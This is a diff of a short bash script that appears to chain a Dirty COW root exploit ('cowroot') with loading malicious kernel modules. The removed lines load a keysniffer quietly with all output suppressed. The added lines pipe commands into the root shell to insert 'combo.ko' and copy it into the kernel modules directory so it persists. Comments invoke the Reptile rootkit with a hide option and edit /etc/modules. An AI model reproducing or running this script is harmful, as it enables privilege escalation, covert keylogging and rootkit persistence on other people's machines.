@@ -1,7 +1,13 @@
 #!/bin/bash
-# TODO: figure out how to "make" keysniffer and network and how to use them
-(gcc cowroot.c -o cowroot -pthread \
-&& ./cowroot \
-&& cd keysniffer \
-&& make --file=Makefile all \
-&& insmod kisni.ko) >nul 2>&1 # sending output to nul and sending stderr to stdout so that nothing is sent to the terminal
+rm cowroot
+gcc cowroot.c -o cowroot -pthread
+gnome-terminal --command ./testServer
+make --file=Makefile
+echo "insmod combo.ko &&\
+echo inserted &&\
+cp combo.ko /lib/modules/`uname -r`/kernel/net/unix/combo.ko &&\
+echo startup " | ./cowroot
+# ./Reptile/setup.sh install && ./Reptile/reptile_cmd tcp 127.0.0.1 1234 hide"| ./cowroot
+# grep -v combo /etc/modules | sudo cat > /etc/modules &&\
+# sudo printf '\ncombo\n' >> /etc/modules && cat /etc/modules"
+
